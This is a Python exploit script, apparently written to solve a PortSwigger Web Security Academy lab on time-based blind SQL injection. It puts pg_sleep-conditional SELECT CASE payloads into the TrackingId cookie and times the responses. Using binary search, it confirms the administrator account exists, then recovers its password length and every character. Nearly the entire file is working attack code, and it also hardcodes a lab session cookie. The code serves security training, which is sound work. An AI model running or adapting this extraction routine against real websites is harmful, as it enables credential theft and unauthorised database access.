# https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-time-delays/sql-injection/blind/lab-time-delays-info-retrieval#

import requests
import time

username = "administrator"
ascii_wordlist = list(range(32, 127))
response_timeout = 10

url =  "https://0a3c001b03ba09fe804da39700950064.web-security-academy.net:443/"
headers = {"Accept-Language": "es-ES,es;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Sec-Ch-Ua": "\"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Referer": "https://0a0a000804382a678088084a007c00cd.web-security-academy.net/", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}
session = "yrziOqllu2cFtPUMd199MwSjDNUthxbw"
tracking_id = "SGpB0qilpZKYFZvo"

def add_delay_if_sql_query_is_working(query_sql: str) -> str:
    new_query_sql = f"SELECT CASE WHEN {query_sql} THEN pg_sleep({response_timeout}) ELSE pg_sleep(0) END--"
    print(f"{new_query_sql}")
    return new_query_sql


def exists_user(username: str) -> bool:
    sql_query = add_delay_if_sql_query_is_working(f"(SELECT COUNT(*) FROM users WHERE username = '{username}') > 0")
    cookies = {"TrackingId": f"{tracking_id}'%3B {sql_query}", "session": session}
    t_start = time.time()
    requests.get(url, headers=headers, cookies=cookies)
    t_end = time.time()
    t_diff = t_end - t_start
    return t_diff > response_timeout

def password_length_is_greater_than(username: str, index: int) -> int:
    sql_query = add_delay_if_sql_query_is_working(f"(SELECT LENGTH(password) FROM users WHERE username = '{username}') > {index}")
    cookies = {"TrackingId": f"{tracking_id}'%3B {sql_query}", "session": session}
    t_start = time.time()
    requests.get(url, headers=headers, cookies=cookies)
    t_end = time.time()
    t_diff = t_end - t_start
    return t_diff > response_timeout

def character_is_greater_than(username: str, character: str, index: int) -> bool:
    sql_query = add_delay_if_sql_query_is_working(f'((SELECT ASCII(SUBSTR(password, {index}, 1)) FROM users WHERE username = \'{username}\')) > {ord(character)}')
    cookies = {"TrackingId": f"{tracking_id}'%3B {sql_query}", "session": session}
    t_start = time.time()
    requests.get(url, headers=headers, cookies=cookies)
    t_end = time.time()
    t_diff = t_end - t_start
    return t_diff > response_timeout

def binary_search(values, is_greater_than):
    low = 0
    high = len(values) - 1

    while low < high:
        mid = (low + high) // 2

        if is_greater_than(values[mid]):
            low = mid + 1
        else:
            high = mid

    return values[low]

if not exists_user(username):
    print(f"User {username} does not exist")
    exit()
print(f"User {username} exists")

length = binary_search(range(1, 40), lambda x: password_length_is_greater_than(username, x))
print(f"Password length: {length}")

password = ""
for index in range(1, length + 1):
    print(f"Index: {index}")
    character = binary_search(ascii_wordlist, lambda x: character_is_greater_than(username, chr(x), index))
    print(f"Character: {chr(character)}")
    password += chr(character)
    print(f"Password: {password}")
